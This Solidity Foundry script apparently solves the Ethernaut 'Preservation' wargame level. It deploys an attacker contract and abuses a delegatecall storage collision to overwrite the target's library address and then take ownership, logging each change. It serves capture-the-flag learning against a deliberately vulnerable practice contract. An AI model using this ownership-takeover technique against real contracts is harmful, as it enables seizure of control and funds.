// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "instances/16_Preservation.sol";
import "contracts/16_Preservation.sol";

contract AttackerPreservationScript is Script {
    Preservation preservation = Preservation(vm.envAddress("INSTANCE"));

    function run() external {
        vm.startBroadcast();

        AttackerPreservation attackerPreservation = new AttackerPreservation();
        console.log("attackerPreservation", address(attackerPreservation));

        console.log("Current timeZone1Library :", preservation.timeZone1Library());
        preservation.setFirstTime(uint256(address(attackerPreservation)));
        console.log("New timeZone1Library :", preservation.timeZone1Library());

        console.log("Current owner :", preservation.owner());
        preservation.setFirstTime(uint256(msg.sender));
        console.log("New owner :", preservation.owner());

        vm.stopBroadcast();
    }
}
